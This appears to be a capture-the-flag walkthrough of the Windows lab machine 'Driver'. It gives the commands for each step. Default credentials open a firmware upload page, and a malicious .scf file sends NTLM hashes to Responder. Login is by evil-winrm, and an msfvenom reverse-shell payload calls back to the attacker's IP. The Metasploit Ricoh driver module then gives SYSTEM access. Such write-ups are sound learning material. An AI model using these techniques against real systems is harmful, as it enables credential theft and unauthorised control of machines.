# Driver
- (name:DRIVER) (domain:DRIVER)

## NMAP
```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2025-10-27T08:16:11
|_  start_date: 2025-10-25T22:41:24
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
```

## Foothold
- null/random username/anonymous smb access is not there
- going to the http port, we get a basic auth page
- trying `admin:admin` access, we get the `MFP Firmware Update Center`
- it says: `Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.`
    - we can upload a file that will go to their share.
- we can do `.scf` exploitation.
- start `responder -I tun0 -v`. create an `attack.scf` file and upload it.
```
[Shell]
Command=2
IconFile=\\10.10.14.67\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- we will get the hash for `tony`
- `evil-winrm -u tony -p liltony` user.txt - 39dc4eb7d70e9fbe4068f4ee474da816

## Privesc
- running `winpeasx64.exe`
```
(DRIVER\Administrator) VerifyFirmware: C:\Users\tony\appdata\local\job\job.bat
    Permissions file: tony [AllAccess]
    Permissions folder(DLL Hijacking): tony [AllAccess]
    Trigger: At log on of DRIVER\tony


RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: tony [FullControl]
    Key: OneDrive
    Folder: C:\Users\tony\AppData\Local\Microsoft\OneDrive
    FolderPerms: tony [AllAccess]
    File: C:\Users\tony\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: tony [AllAccess]

cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    `Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
    ping 1.1.1.1
    ping 1.1.1.1`

C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common

Getting Leaked Handlers, it might take some time...
    Handle: 1604(key)
    Handle Owner: Pid is 3644(winpeas) with owner: tony
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ctf\tip
```
- we know that our use has added printer and we can access the RICOH directories
- searching on google for ricoh v4.23 exploits we see a metasploit module
    - we can confirm this by `searchsploit ricoh`
- going into msfconsole, when we use `windows/local/ricoh_driver_privesc` there is a session required.
- create a meterpreter payload `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.67 LPORT=4444 -f exe > shell.exe`
    - upload to winrm session
- `msfconsole`
    - `use multi/handler`
    - `set payload windows/meterpreter/reverse_tcp` the one we used above
    - `run`
- in the winrm session `.\shell.exe`
- in meterpreter session, 
    - confirm the windows architecture using `sysinfo` - `x64` in our case
    - `ps` to see our `shell.exe` being run as `x86` and not `x64`
    - `migrate -N explorer.exe`
    - `background` - backgrounding as session 1
    - use `windows/local/ricoh_driver_privesc`
    - `set SESSION 1`
    - `set payload windows/x64/meterpreter/reverse_tcp`
    - set LHOSTS /LPORT if needed
    - `run`

- we have a meterpreter session as `NT\AUTHORITY` - 60801c916bd91d7454c2d35cb6fd2b12
